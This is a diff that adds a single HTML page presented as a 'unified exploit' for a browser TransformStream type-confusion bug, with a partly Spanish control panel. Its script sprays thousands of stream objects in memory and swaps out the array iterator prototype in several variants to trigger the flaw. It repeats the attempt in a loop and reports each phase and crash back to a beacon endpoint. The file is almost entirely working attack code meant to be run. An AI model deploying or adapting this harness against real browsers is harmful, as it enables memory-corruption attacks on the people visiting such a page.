@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CVE-2026-43705 Unified Exploit</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .panel {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin: 10px 0;
+            background: #111;
+        }
+        .status { color: #00ffff; }
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+        .warning { color: #ffaa00; }
+        button {
+            background: #003300;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: monospace;
+            margin: 5px;
+        }
+        button:hover { background: #004400; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        #log {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            padding: 10px;
+            background: #000;
+        }
+        .variant { display: inline-block; margin: 0 10px; }
+    </style>
+</head>
+<body>
+    <h2>CVE-2026-43705 TransformStream Type Confusion</h2>
+    
+    <div class="panel">
+        <strong>Estado:</strong> <span id="phase" class="status">READY</span> | 
+        <strong>Iteración:</strong> <span id="iter">0</span> | 
+        <strong>Streams:</strong> <span id="streams">0</span> | 
+        <strong>Hits:</strong> <span id="hits" class="success">0</span> |
+        <strong>Variante:</strong> <span id="current_variant">-</span>
+    </div>
+
+    <div class="panel">
+        <button id="btn_start" onclick="startAttack()">Iniciar Ataque</button>
+        <button id="btn_stop" onclick="stopAttack()" disabled>Detener</button>
+        <button onclick="clearLog()">Limpiar Log</button>
+        <div class="variant">
+            <label><input type="checkbox" id="chk_spray" checked> Memory Spray</label>
+            <label><input type="checkbox" id="chk_variantA" checked> Variant A (OOB)</label>
+            <label><input type="checkbox" id="chk_variantB" checked> Variant B (Type)</label>
+        </div>
+    </div>
+
+    <div class="panel">
+        <div id="log"></div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            SPRAY_CHUNK_SIZE: 2000,
+            SPRAY_MAX_STREAMS: 50000,
+            DELAY_BETWEEN_ROUNDS: 50,
+            BEACON_INTERVAL: 2000
+        };
+
+        let state = {
+            running: false,
+            iteration: 0,
+            streams: [],
+            hits: 0,
+            phase: 'READY',
+            origIter: Array.prototype[Symbol.iterator]
+        };
+
+        function log(msg, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logDiv = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.className = type;
+            entry.textContent = `[${timestamp}] ${msg}`;
+            logDiv.insertBefore(entry, logDiv.firstChild);
+            while (logDiv.children.length > 100) {
+                logDiv.removeChild(logDiv.lastChild);
+            }
+        }
+
+        function beacon(msg) {
+            try {
+                const img = new Image();
+                img.src = '/beacon?cve=2026-43705&msg=' + encodeURIComponent(msg) + '&t=' + Date.now();
+            } catch (e) {}
+        }
+
+        function updateUI() {
+            document.getElementById('phase').textContent = state.phase;
+            document.getElementById('iter').textContent = state.iteration;
+            document.getElementById('streams').textContent = state.streams.length;
+            document.getElementById('hits').textContent = state.hits;
+        }
+
+        function setPhase(ph) {
+            state.phase = ph;
+            updateUI();
+            beacon(ph);
+            log('Fase: ' + ph, 'status');
+        }
+
+        function sprayStreams(count) {
+            if (!document.getElementById('chk_spray').checked) return;
+            setPhase('SPRAY-' + state.streams.length);
+            for (let i = 0; i < count && state.streams.length < CONFIG.SPRAY_MAX_STREAMS; i++) {
+                try {
+                    state.streams.push(new ReadableStream());
+                    state.streams.push(new WritableStream());
+                } catch (e) {
+                    log('Spray limit reached at ' + state.streams.length, 'warning');
+                    break;
+                }
+            }
+            updateUI();
+        }
+
+        function tryVariant(variantName, iterFn) {
+            if (!state.running) return false;
+            document.getElementById('current_variant').textContent = variantName;
+            Array.prototype[Symbol.iterator] = iterFn;
+            try {
+                setPhase('TRIGGER-' + variantName + '@' + state.streams.length);
+                const ts = new TransformStream({});
+                if (ts && ts.readable !== undefined && ts.writable !== undefined) {
+                    state.hits++;
+                    log(`SURVIVED ${variantName} - Hit #${state.hits}`, 'success');
+                    beacon('SURVIVED-' + variantName + '-' + state.hits);
+                    return true;
+                }
+            } catch (e) {
+                log(`${variantName} exception: ${e.message}`, 'error');
+                beacon('EXCEPTION-' + variantName + '-' + e.message);
+            } finally {
+                Array.prototype[Symbol.iterator] = state.origIter;
+            }
+            return false;
+        }
+
+        function variantA_OOB() {
+            tryVariant('A0', function*() {});
+            tryVariant('A1', function*() { yield {}; });
+            tryVariant('A2', function*() { yield {}; yield {}; });
+        }
+
+        function variantB_Type() {
+            tryVariant('B', function*() { yield {}; yield {}; yield {}; });
+        }
+
+        function attackRound() {
+            if (!state.running) return;
+            try {
+                state.iteration++;
+                if (state.iteration % 5 === 0 && state.streams.length < CONFIG.SPRAY_MAX_STREAMS) {
+                    sprayStreams(CONFIG.SPRAY_CHUNK_SIZE);
+                }
+                if (document.getElementById('chk_variantA').checked) variantA_OOB();
+                if (document.getElementById('chk_variantB').checked) variantB_Type();
+                updateUI();
+                setTimeout(attackRound, CONFIG.DELAY_BETWEEN_ROUNDS);
+            } catch (e) {
+                setPhase('CRASH-' + e.message);
+                log('CRASH: ' + e.message, 'error');
+                beacon('CRASH-' + e.message);
+                stopAttack();
+            }
+        }
+
+        function startAttack() {
+            if (state.running) return;
+            state.running = true;
+            document.getElementById('btn_start').disabled = true;
+            document.getElementById('btn_stop').disabled = false;
+            log('=== ATAQUE INICIADO ===', 'success');
+            beacon('START');
+            state.beaconInterval = setInterval(() => {
+                beacon('ALIVE-' + state.iteration + '-' + state.streams.length);
+            }, CONFIG.BEACON_INTERVAL);
+            attackRound();
+        }
+
+        function stopAttack() {
+            state.running = false;
+            document.getElementById('btn_start').disabled = false;
+            document.getElementById('btn_stop').disabled = true;
+            document.getElementById('current_variant').textContent = '-';
+            if (state.beaconInterval) clearInterval(state.beaconInterval);
+            Array.prototype[Symbol.iterator] = state.origIter;
+            setPhase('STOPPED');
+            log('=== ATAQUE DETENIDO ===', 'warning');
+            beacon('STOP');
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+        }
+
+        window.onbeforeunload = function() { stopAttack(); };
+        log('CVE-2026-43705 Unified Exploit cargado', 'success');
+        beacon('LOADED');
+    </script>
+</body>
+</html>
